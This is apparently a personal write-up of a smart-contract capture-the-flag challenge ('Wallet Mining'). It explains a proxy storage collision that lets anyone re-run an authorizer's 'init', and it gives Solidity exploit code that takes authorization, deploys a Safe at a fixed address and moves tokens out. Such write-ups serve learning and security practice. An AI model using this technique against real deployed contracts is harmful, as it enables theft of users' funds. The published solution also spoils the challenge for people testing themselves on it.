# Solving the Wallet Mining – My Journey

## TL;DR

Honestly, this challenge wasn't as challenging as I hoped it would be. The only part that gave me trouble was figuring out the right `initializer` for the `WalletDeployer::drop` function to successfully deploy the `USER_DEPOSIT_ADDRESS`. And trust me, when you figure it out, you'll be like "what?? why is this so simple??" This should be harder for a 13th challenge!

Oh, and the nonce? I just brute-forced it with a for loop and boom - it was **13**. Of course it was 13.

## The Main Trick - Storage Collision

The whole challenge boils down to one thing: there's a **storage collision** in the _authorization upgradeable_ mechanism. Once you figure this out, everything else clicks into place.

Here's what's happening:

- `TransparentProxy` has this `upgrader` variable sitting at s`lot 0`
- The implementation contract `AuthorizerUpgradeable` also has `needsInit` at `slot 0`

When this proxy gets deployed:

```javascript
authorizer = address(
  new TransparentProxy( // proxy
    address(new AuthorizerUpgradeable()), // implementation
    abi.encodeCall(AuthorizerUpgradeable.init, (wards, aims)) // init data
  )
);
```

The `init` function gets called via **delegate call**, which means it runs in the proxy's context. So when it checks `needsInit`, it's actually reading the `upgrader` value from the proxy!

```javascript
function init(address[] memory _wards, address[] memory _aims) external {
        require(needsInit != 0, "cannot init");
        for (uint256 i = 0; i < _wards.length; i++) {
            _rely(_wards[i], _aims[i]);
        }
        needsInit = 0;
    }
```

Initially, `upgrader` is set to the _AuthorizerFactory address_ (non-zero), so the check passes. But then `needsInit = 0` actually sets `upgrader = address(0)` in the proxy. This makes it super easy for anyone to call `init` again since the check is now reading from the proxy's storage.

## My solution

1. **Exploit the auth bug**
   - I took advantage of the `storage collision` and set myself as the `ward` and `USER_DEPOSIT_ADDRESS` as the `aim`.

```javascript
    address[] memory _wards = new address[](1);
    _wards[0] = address(this);
    address[] memory _aims = new address[](1);
    _aims[0] = i_userDepositAddress;
    i_authorizer.init(_wards, _aims);
```

2. **Figure out the drop parameters**

   - This was the trial and error part. After spending time at it for long, I realized the `initializer` is just a simple `Safe.setup` call to set the `owner` and `threshold`. That's it!

3. **Rescue Function**
   - Here's my rescuer contract `TokenRescuer` doing all the heavy lifting.
   - This deploys the `USER_DEPOSIT_ADDRESS` with the right code and moves the rewards to the `ward` address.

```javascript
function rescue() external {
        // Set up my auth
        address[] memory _wards = new address[](1);
        _wards[0] = address(this);
        address[] memory _aims = new address[](1);
        _aims[0] = i_userDepositAddress;
        i_authorizer.init(_wards, _aims);
        // Check if it worked
        bool result = i_authorizer.can(address(this), _aims[0]);
        console.log("Result: ", result);
        // Set up the Safe parameters
        address[] memory _owners = new address[](1);
        _owners[0] = i_userToSave;
        uint256 _threshold = 1;
        address fallbackHandler = address(0);
        address paymentToken = address(0);
        uint256 payment = 0;
        address payable paymentReceiver = payable(address(0));

        bytes memory initializer = abi.encodeCall(
            Safe.setup,
            (_owners, _threshold, address(0), bytes(""), fallbackHandler, paymentToken, payment, paymentReceiver)
        );
        // The magical nonce 13!
        i_walletDeployer.drop(address(i_userDepositAddress), initializer, 13);
        assert(i_token.balanceOf(address(this)) == i_walletDeployer.pay());
        // sends the reward to ward
        i_token.transfer(i_ward, i_token.balanceOf(address(this)));
    }
```

4. **Move the user's funds**
   - The final step was executing a transaction to move the `DEPOSIT_TOKEN_AMOUNT` from `USER_DEPOSIT_ADDRESS` back to the `user`. I did this part directly in the test since I didn't want to mess with moving the `userPrivateKey` around:

```javascript
 bytes32 messageHash = Safe(payable(USER_DEPOSIT_ADDRESS)).getTransactionHash({
            to: address(token),
            value: 0,
            data: abi.encodeCall(IERC20.transfer, (user, DEPOSIT_TOKEN_AMOUNT)),
            operation: Enum.Operation.Call,
            safeTxGas: 0,
            baseGas: 0,
            gasPrice: 0,
            gasToken: address(0),
            refundReceiver: payable(address(0)),
            _nonce: Safe(payable(USER_DEPOSIT_ADDRESS)).nonce()
        });
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, messageHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
            address(token),
            0,
            abi.encodeCall(IERC20.transfer, (user, DEPOSIT_TOKEN_AMOUNT)),
            Enum.Operation.Call,
            0,
            0,
            0,
            address(0),
            payable(address(0)),
            signature
    );
```

5. And that's it! Challenge solved.

## Final Thoughts

Once you spot the _storage collision_, this challenge becomes pretty straightforward. The tricky part was just figuring out that the **initializer** which is a simple `Safe::setup` call. Sometimes the simplest solution is the right one!
